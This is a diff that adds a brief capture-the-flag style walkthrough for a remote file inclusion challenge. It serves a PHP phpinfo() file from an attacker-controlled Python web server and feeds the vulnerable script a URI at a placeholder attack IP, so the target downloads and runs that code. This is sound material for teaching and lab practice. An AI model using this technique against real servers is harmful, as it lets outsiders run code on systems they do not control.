@@ -1,0 +1,19 @@
+Challenge 0 - http://hello.com/world.php
+
+In this challenge, you must provide a URI pointing to a file containing PHP code that runs phpinfo(). We can use our own web server to achieve this. First, we write a quick PHP script:
+
+$ mkdir evil_files
+$ cat > evil_files/phpinfo.txt
+<?php
+phpinfo();
+?>
+
+Next, we need to serve the file. Python has a built in web server module we can use for this.
+
+$ cd evil_files
+$ python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+
+Now we just need to point our vulnerable script at our attacking system, with the following URI:
+
+http://<attack_ip>:8000/phpinfo.txt
